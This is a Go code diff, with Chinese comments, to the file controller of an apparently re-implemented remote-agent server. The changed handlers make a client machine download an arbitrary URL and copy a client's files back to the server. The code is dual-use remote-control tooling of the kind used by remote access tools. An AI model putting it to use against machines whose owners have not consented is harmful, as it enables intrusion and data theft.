@@ -243,7 +243,18 @@ func (c *FileController) Wget() {
 		c.JsonErr("id error")
 		return
 	}
-	if !c.dispatchOrReport(id, "wget -O "+joinPath(path, target)) {
+	// 走 JSON 命令（agent 的 CmdWget）：文本 "wget -O <dst>" 没有解析器，
+	// 会落进 shell。url 由 target 字段承载（与前端约定一致），dst 为 path 目录下同名。
+	url := target
+	if url == "" {
+		url = path
+	}
+	dst := joinPath(path, fileNameFromURL(url))
+	if path == "" {
+		dst = fileNameFromURL(url)
+	}
+	req, _ := json.Marshal(map[string]string{"type": "wget", "url": url, "dst": dst})
+	if !c.dispatchOrReport(id, string(req)) {
 		return
 	}
 	c.JsonOkMessage("ok")
@@ -415,10 +426,26 @@ func (c *FileController) DownloadToOSS() {
 		c.JsonErr("id error")
 		return
 	}
-	if !c.dispatchOrReport(id, "download "+path+" "+target) {
+	// 原版把文件下载到服务器后再上传 OSS。复刻端 OSS 凭据/桶配置尚未实现，
+	// 这里先分块把文件取回服务器（downloads/），再明确报告 OSS 未实现，
+	// 而不是发一条 agent 不认识、最终落进 shell 的文本命令。
+	data, errMsg := engineDownloadFile(id, joinPath(path, target))
+	if errMsg != "" {
+		c.JsonErr(errMsg)
 		return
 	}
-	c.JsonOkMessage("ok")
+	dir := filepath.Join("downloads", strconv.FormatInt(id, 10))
+	if err := os.MkdirAll(dir, 0o755); err != nil {
+		c.JsonErr(err.Error())
+		return
+	}
+	name := filepath.Base(joinPath(path, target))
+	local := filepath.Join(dir, name)
+	if err := os.WriteFile(local, data, 0o644); err != nil {
+		c.JsonErr(err.Error())
+		return
+	}
+	c.JsonErr("oss upload not implemented (file staged at " + local + ")")
 }
 
 // joinPath 按原版拼接 path 与 target（反编译 FUN_0044a940，分隔符 "/"）。
@@ -724,4 +751,19 @@ func engineDownloadFileTracked(clientID int64, remotePath string, taskID int64) 
 		offset += int64(len(chunk))
 	}
 	return out, ""
+}
+
+// fileNameFromURL 取 URL 路径里的文件名（wget 的默认落盘名）。
+func fileNameFromURL(u string) string {
+	if i := strings.IndexAny(u, "?#"); i >= 0 {
+		u = u[:i]
+	}
+	u = strings.TrimRight(u, "/")
+	if i := strings.LastIndex(u, "/"); i >= 0 {
+		u = u[i+1:]
+	}
+	if u == "" {
+		return "index.html"
+	}
+	return u
 }
